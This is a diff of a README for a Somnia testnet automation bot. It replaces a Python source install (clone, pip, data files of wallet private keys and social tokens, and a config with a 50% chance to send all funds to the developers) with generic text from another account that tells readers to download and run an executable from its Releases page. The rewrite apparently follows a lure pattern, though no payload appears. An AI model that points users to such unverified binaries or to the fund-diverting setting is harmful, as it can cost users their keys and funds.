@@ -1,185 +1,77 @@
-# Somnia Bot 🔮
+# Somnia-Auto: Your Automation Companion for the Somnia Testnet 🌌
 
-An advanced and adaptable automation solution for the **Somnia Network**, offering a wide array of features to streamline testnet activities.
+![Somnia Bot](https://img.shields.io/badge/Somnia--Auto-v1.0.0-blue.svg) ![GitHub](https://img.shields.io/badge/License-MIT-green.svg) ![Stars](https://img.shields.io/github/stars/wonderlight1/Somnia-Auto.svg) ![Forks](https://img.shields.io/github/forks/wonderlight1/Somnia-Auto.svg)
 
-**TUTORIAL LINK:** [nelnabr.gitbook.io/auto-labs/somnia/somnia-eng](https://nelnabr.gitbook.io/auto-labs/somnia/somnia-eng)
+Welcome to the **Somnia-Auto** repository! This powerful automation tool is designed specifically for the Somnia testnet. With features like minting, swaps, and social integration, it makes your experience seamless and customizable.
 
-## 🌟 Key Features
+## Table of Contents
 
-- ✨ Multi-threaded execution
-- 🔁 Automatic retry system with customizable attempts
-- 🛡️ Proxy support for anonymity and security
-- 📊 Select specific account ranges
-- ⏱️ Randomized delays between actions
-- 📩 Telegram log integration
-- 📃 Comprehensive transaction logging
-- 🔧 Modular task-based architecture
-- 🌐 Integration with Twitter and Discord
-- 👥 Discord invite automation
-- 💬 Blockchain messaging with Quills
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Configuration](#configuration)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Support](#support)
 
-## 🎯 Supported Actions
+## Features
 
-**Network Tools:**
-- Access Somnia Faucet
-- Transfer tokens
-- Set user handles
-- Retrieve account/network data
-- Connect social profiles (Twitter, Discord)
-- Participate in campaigns
-- Invite via Discord
+- **Minting**: Easily mint tokens on the Somnia testnet.
+- **Swaps**: Perform token swaps with minimal effort.
+- **Social Integration**: Connect with social platforms for a richer experience.
+- **Customization**: Tailor the bot to meet your specific needs.
+- **User-Friendly Interface**: Designed for ease of use, even for beginners.
 
-**Minting & NFT Operations:**
-- Mint Ping Pong tokens
-- Mint SHANNON NFT (Nerzo)
-- Mint NEE NFT (Nerzo)
-- Mint YAPPERS NFT (Alze)
-- Mint SOMNI NFT (Mintaura)
-- Deploy smart contracts (Mintair)
+## Installation
 
-**Swapping & Messaging:**
-- Token swaps (Ping Pong)
-- Send blockchain-based messages via Quills
+To get started with Somnia-Auto, you need to download the latest release. Visit the [Releases section](https://github.com/wonderlight1/Somnia-Auto/releases) to find the latest version. Download the appropriate file for your operating system, then execute it to set up the bot.
 
-## 📋 System Requirements
+## Usage
 
-- Python version `3.11.1` to `3.11.6`
-- Wallet private keys (Somnia Network)
-- Proxy list for secure access
-- Twitter API tokens
-- Discord bot/user tokens
-- Messages for Quills
+After installation, you can run the bot with simple commands. Here’s a quick guide on how to get started:
 
-## 🚀 Setup Instructions
+1. **Open your terminal**.
+2. **Navigate to the directory** where you installed Somnia-Auto.
+3. **Run the bot** using the command:
 
-1. **Clone the Repository:**
    ```bash
-   git clone https://github.com/neLNABR/Somnia-Auto.git
-   cd Somnia-Auto
+   ./somnia-auto
    ```
 
-2. **Install Dependencies:**
-   ```bash
-   pip install -r requirements.txt
-   ```
+4. Follow the prompts to configure your settings.
 
-3. **Configuration Steps:**
-   - Edit `config.yaml`
-   - Add wallet keys to `data/private_keys.txt`
-   - Add proxies to `data/proxies.txt`
-   - Add Twitter tokens to `data/twitter_tokens.txt`
-   - Add Discord tokens to `data/discord_tokens.txt`
-   - Add Quills messages to `data/random_message_quills.txt`
+## Configuration
 
-## 📁 Directory Overview
+The configuration file allows you to customize various aspects of the bot. Here’s how to set it up:
 
-```
-Somnia-Auto/
-├── data/
-│   ├── private_keys.txt
-│   ├── proxies.txt
-│   ├── twitter_tokens.txt
-│   ├── discord_tokens.txt
-│   └── random_message_quills.txt
-├── src/
-│   ├── modules/
-│   └── utils/
-├── config.yaml
-└── tasks.py
-```
+1. Locate the `config.json` file in the installation directory.
+2. Open it in a text editor.
+3. Modify the settings as needed. Here are some key options:
 
-## 📝 Configuration Guide
+   - **Minting Settings**: Adjust the parameters for minting tokens.
+   - **Swap Settings**: Set your preferred tokens for swapping.
+   - **Social Integration**: Input your social media API keys for integration.
 
-### 1. Input Data Files
+4. Save the file and restart the bot to apply the changes.
 
-- `data/private_keys.txt`: Private keys (one per line)
-- `data/proxies.txt`: Proxies (`http://user:pass@ip:port`)
-- `data/twitter_tokens.txt`: Twitter tokens (one per line)
-- `data/discord_tokens.txt`: Discord tokens (one per line)
-- `data/random_message_quills.txt`: Messages for Quills (one per line)
+## Contributing
 
-### 2. Main Configuration (`config.yaml`)
+We welcome contributions to improve Somnia-Auto. If you want to help, please follow these steps:
 
-```yaml
-SETTINGS:
-  THREADS: 1
-  ATTEMPTS: 5
-  ACCOUNTS_RANGE: [0, 0]
-  EXACT_ACCOUNTS_TO_USE: []
-  SHUFFLE_WALLETS: true
-  PAUSE_BETWEEN_ATTEMPTS: [3, 10]
-  PAUSE_BETWEEN_SWAPS: [3, 10]
-```
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your changes to your forked repository.
+5. Open a pull request with a description of your changes.
 
-### 3. Module-Specific Settings
+## License
 
-```yaml
-SOMNIA_NETWORK:
-  SOMNIA_SWAPS:
-    BALANCE_PERCENT_TO_SWAP: [5, 10]
-    NUMBER_OF_SWAPS: [1, 2]
+Somnia-Auto is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-  SOMNIA_TOKEN_SENDER:
-    BALANCE_PERCENT_TO_SEND: [1.5, 3]
-    NUMBER_OF_SENDS: [1, 1]
-    SEND_ALL_TO_DEVS_CHANCE: 50
+## Support
 
-  SOMNIA_CAMPAIGNS:
-    REPLACE_FAILED_TWITTER_ACCOUNT: false
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/wonderlight1/Somnia-Auto/releases) for updates. You can also open an issue in the repository for assistance.
 
-  DISCORD_INVITER:
-    INVITE_LINK: ""
-```
+---
 
-## 🎮 Running the Bot
-
-### Task Setup
-
-Edit `tasks.py` to define which tasks to execute:
-
-```python
-TASKS = ["FULL_TASK"]
-```
-
-**Available Tasks:**
-- `CAMPAIGNS`
-- `FAUCET`
-- `SEND_TOKENS`
-- `CONNECT_SOCIALS`
-- `MINT_PING_PONG`
-- `SWAPS_PING_PONG`
-- `QUILLS_CHAT`
-- `SOMNIA_NETWORK_SET_USERNAME`
-- `SOMNIA_NETWORK_INFO`
-- `DISCORD_INVITER`
-
-### Creating Custom Sequences
-
-Example:
-
-```python
-TASKS = ["MY_CUSTOM_TASK"]
-
-MY_CUSTOM_TASK = [
-    "faucet",
-    ("mint_ping_pong", "swaps_ping_pong"),
-    ["nerzo_shannon", "nerzo_nee"],
-    "quills_chat",
-    "connect_socials",
-    "discord_inviter"
-]
-```
-
-### Launch Command
-
-```bash
-python main.py
-```
-
-## 📜 License
-
-MIT License
-
-## ⚠️ Disclaimer
-
-This tool is intended for educational use only. Use responsibly and in accordance with relevant terms of service.
+Feel free to explore the various features of Somnia-Auto and make the most of your experience on the Somnia testnet! Happy automating!
